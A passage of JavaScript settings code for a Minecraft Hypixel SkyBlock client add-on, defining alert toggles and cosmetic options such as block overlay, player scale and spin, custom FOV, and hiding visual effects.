    title: "§4M7 §6Ragnarock Axe§f Alert",
    description: "\n§fShows on screen when to use §6Ragnarock Axe§f before §4p5§f starts",
    category: "Alerts",
    subcategory: "Dungeons",
    configName: "M7Rangarock",
})
.addSwitch({
    title: "§cM6 §dGyro §fAlerts",
    description: "\n§fShows on screen when to §dGyro§f at §cTerracotta phase\n\n §4§l§nWIP",
    category: "Alerts",
    subcategory: "Dungeons",
    configName: "M6Gyro",
})
.addSwitch({
    title: "§bL§do§bc§dk §bC§dh§be§ds§bt §fAlert",
    description: "\n§fShows on screen when the chest you tried to open is §4LOCKED",
    category: "Alerts",
    subcategory: "Dungeons",
    configName: "LockChestAlert",
})
.addSwitch({
    title: "§6Place §cEnergy Crystal§f Alert",
    description: "\n§fShows a warning when after you took an Energy Crystal",
    category: "Alerts",
    subcategory: "Dungeons",
    configName: "EnergyCrystalAlert",
})
.addSwitch({
    title: "§aRNG §5Meter §aReset Alert",
    description: "\n§fShows on screen when the §aRNG §5Meter§f Resets\n§b§lAlso Plays Really cool intro music",
    category: "Alerts",
    subcategory: "Dungeons",
    configName: "RNGMeterResetAlert",
})


.addSwitch({
    title: "§6Sold AH Notification",
    description: "\n§fPlays A sound when an item on your AH sold",
    category: "Alerts",
    subcategory: "",
    configName: "SoldAHNotification",
})
.addSwitch({
    title: "§9Bonzo Mask§f Alert",
    description: "\n§fShows on screen when the §9Bonzo Mask §6Ability§f has been used",
    category: "Alerts",
    subcategory: "",
    configName: "BonzoMaskAlert",
})
.addSwitch({
    title: "Spirit Mask Alert",
    description: "\n§fShows on screen when the §fSpirit Mask §6Ability§f has been used",
    category: "Alerts",
    subcategory: "",
    configName: "SpiritMaskAlert",
})
.addSwitch({
    title: "§5Phoenix Pet Alert",
    description: "\n§fShows on screen when the §5Phoenix Pet §6Ability§f has been used",
    category: "Alerts",
    subcategory: "",
    configName: "PhoenixPetAlert",
})
.addSwitch({
    title: "§cArrows Alert",
    description: "\n§fShows on screen when you need to get more Arrows",
    category: "Alerts",
    subcategory: "",
    configName: "ArrowsAlert",
})
.addSwitch({
    title: "§9§lFull Thunder Bottle Alert",
    description: "\n§fShows a notification on screen when the Empty Thunder Bottle filled to the end",
    category: "Alerts",
    subcategory: "",
    configName: "FullThunderBottleAlert",
})
.addSwitch({
    title: "§4§lNo Thunder In A Bottle Alert",
    description: "\n§fShows a notification on screen when you dont have an empty thunder bottle in your inventory",
    category: "Alerts",
    subcategory: "",
    configName: "NoThunderInABottleAlert",
})








.addSwitch({
    title: "§9§nBlock Overlay",
    description: "\n§4No need, Surely you know what this feature does",
    category: "Cosmetic",
    subcategory: "BlockOverlay",
    configName: "BlockOverlay",
})
.addDropDown({
    title: "§9Block Overlay §eType",
    description: "\n§fHow to highlight the block",
    category: "Cosmetic",
    subcategory: "BlockOverlay",
    configName: "BlockOverlayType",
    options: ["Outline","Overlay","Outline + Overlay"],
    value: 0,
})
.addSlider({
    title: "§bOutline §6Thickness",
    description: "\n",
    category: "Cosmetic",
    subcategory: "BlockOverlay",
    configName: "BlockOverlayOutlineThickness",
    options: [1, 10],
    value: 2,
})
.addColorPicker({
    title: "§bOutline §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the Outline",
    category: "Cosmetic",
    subcategory: "BlockOverlay",
    configName: "BlockOverlayOutlineColor",
    value: [255, 255, 255, 255],
})
.addColorPicker({
    title: "§dOverlay §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the Overlay",
    category: "Cosmetic",
    subcategory: "BlockOverlay",
    configName: "BlockOverlayOverlayColor",
    value: [255, 255, 255, 70],
})
.addToggle({
    title: "§6Show Through Blocks?",
    description: "\n",
    category: "Cosmetic",
    subcategory: "BlockOverlay",
    configName: "BlockOverlayESP",
})





.addSwitch({
    title: "§4Player §6Scale",
    description: "\n§fAllows to dynamically adjust the §4size of the §6player character's scale§f from the default 100% down to 30%. ",
    category: "Cosmetic",
    subcategory: "Player",
    configName: "PlayerScale",
})
.addSlider({
    title: "§4Player §6Scale §d§l%",
    description: "\n",
    category: "Cosmetic",
    subcategory: "Player",
    configName: "CustomPlayerScale",
    options: [30, 100],
    value: 100,
})
.addSwitch({
    title: "§bPlayer §dSpin",
    description: "\n§fClient-side feature that allows players to make their in-game avatar spin in place. This visual effect is only visible to the player using the module and does not affect the view or gameplay of other players on the server.",
    category: "Cosmetic",
    subcategory: "Player",
    configName: "ClientSideSpin",
})
.addDropDown({
    title: "§dSpin §adiraction",
    description: "\n",
    category: "Cosmetic",
    subcategory: "Player",
    configName: "SpinDiraction",
    options: ["Right","Left"],
    value: 0,
})
.addSlider({
    title: "§dSpin speed",
    description: "\n",
    category: "Cosmetic",
    subcategory: "Player",
    configName: "SpinSpeed",
    options: [30, 200],
    value: 30,
})
.addToggle({
    title: "§4Should I spin everyone?",
    description: "\n",
    category: "Cosmetic",
    subcategory: "Player",
    configName: "SpinOnEveryone",
})












.addSwitch({
    title: "§cRemove §aSword Block",
    description: "\n§aEnables §6Minecraft §b1.9§d RightClick animation§f to the following swords:\n §8All Wither blades, §6Rogue Sword, §7wither cloak, §9Aspect of the end, §6All Jerry Swords, §bAll VoidGloom Katanas, §dAspect of the Dragons",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "NoSwordBlock",
})
.addSwitch({
    title: "§cRemove §aSelfie Camera",
    description: "\n§cRemoves§f The Selfie Mode From F5",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "RemoveSelfieCamera",
})
.addSwitch({
    title: "§6Custom §bFOV",
    description: "\n§BAllows to set §6Custom Minecraft§B FOV (Field of View)",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "CustomFOV",
})
.addSlider({
    title: "§bFOV",
    description: "\n",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "FOV",
    options: [30, 179],
    value: Client.settings.getFOV(),
})
.addSwitch({
    title: "§dPink DMs",
    description: "\n§fChanges the §aC§bo§cl§do§er§f of the Private massage in Hypixel from §7Gray to §dPink",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "PinkDMs",
})

.addSwitch({
    title: "§eHide §cFalling Blocks",
    description: "\n§eHides §cFalling Blocks§f in order to §aimprove fps",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "HideFallingBlocks",
})
.addSwitch({
    title: "§eHide §5Portal Effect",
    description: "\n§dDisables the §4annoying §5Nether Portal Effect",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "HidePortalEffect",
})
.addSwitch({
    title: "§eHide Lightning",
    description: "\n§cStops §eLightning Effect§f from §arendering",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "HideLightning",
})
.addSwitch({
    title: "§4§lFuck §0§lBlindness!",
    description: "\n§fRemoves the §4Fucking Annoying §0Blindness Effect §b(Client-side ofc)",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "NoBlindness",
})
.addSwitch({
    title: "§6Custom §dSlot §bHighlight",
    description: "\n§fChanges the §aC§bo§cl§do§er§f and the opacity of Minecraft Vanilla slot highlight\n\n§c§lCurrently does not work with old version §d§lsba§f for some reason ",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "CustomSlotHighlight",
})
.addColorPicker({
    title: "Slot Highlight §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the Overlay",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "CustomSlotHighlightColor",
    value: [255, 255, 255, 150],
})
.addSwitch({
    title: "§dTime §bChanger",
    description: "\n",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "TimeChanger",
})
.addDropDown({
    title: "§aTime Mode",
    description: "\n",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "TimeChangerMode",
    options: ["Day","Night","Noon","Midnight","Sunrise","Sunset"],
    value: 0,
})
.addSwitch({
    title: "§3Inventory Search Bar",
    description: "\n§fSame as NEU's one",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "InventorySearchBar",
})
.addSwitch({
    title: "§9Blur §fBackground",
    description: "\n§fApply a Sexy Blur Effect to the Background",
    category: "Cosmetic",
    subcategory: "Visuals",
    configName: "BlurBackground",
})





/*
.addButton({
    title: "apply ColorScheme Changes",
    description: "\nNeed to click this for window to reload with selected changes",
    category: "Dev",
    configName: "apply",
    onClick(data) {
        data
        .setScheme("RandomShit/ColorScheme.json")
        .apply()
        console.log(`setScheme Applyed`)
    }
})

.addKeybind({
    title: "Test Keybind",
    description: "\nTest Keybind",
    category: "Dev",
    subcategory: "Test",
    configName: "TestKeybind",
    value: 31,
})
.addMultiCheckbox({
    title: "Multi check box test",
    description: "\nTesting multi checkbox component!",
    category: `Dev`,
    subcategory: `Test`,
    placeHolder: "Click",
    configName: "multiCheckBoxTest",
    options: [
        {
            title: "Multi Checkbox Test",
            configName: "multi1",
            value: false,
        },
        {
            title: "Multi Checkbox Test",
            configName: "multi2",
            value: false
        },
        {
            title: "Multi Checkbox Test",
            configName: "multi3",
            value: true
        },
        {
            title: "Multi Checkbox Test",
            configName: "multi4",
            value: false
        }
    ]
})*/


const categories = [
    "General",
    "Dungeons", 
    "Alerts", 
    "Cosmetic",
   // "Dev"
    //"Credits" // maybe someday soon
]

const Settings = new FuckYouIWantToUseThatName("NoammAddons", config, "RandomShit/ColorScheme.json", `${fullName} §4§l§nVersion:§r§n §6§l§n${getModuleVersion()}§r`)

    .onOpenGui(() => {
        Settings
        .setSize(101, 101)
        .setPos(-1, -1)
        .setCategorySort((a, b) => categories.indexOf(a.category) - categories.indexOf(b.category))
       // .sortElements((a, b) => a.title - b.title)
        .apply()
    })

    .onOpenGui(() => {
        setTimeout(() => Settings.searchBar._focusSearch(), 50)
        Settings.AmaterasuGui.searchBar.x = 80;
        Settings.apply()
    })

export const SettingsGUIHandler = Settings.getHandler()


export default () => Settings.settings

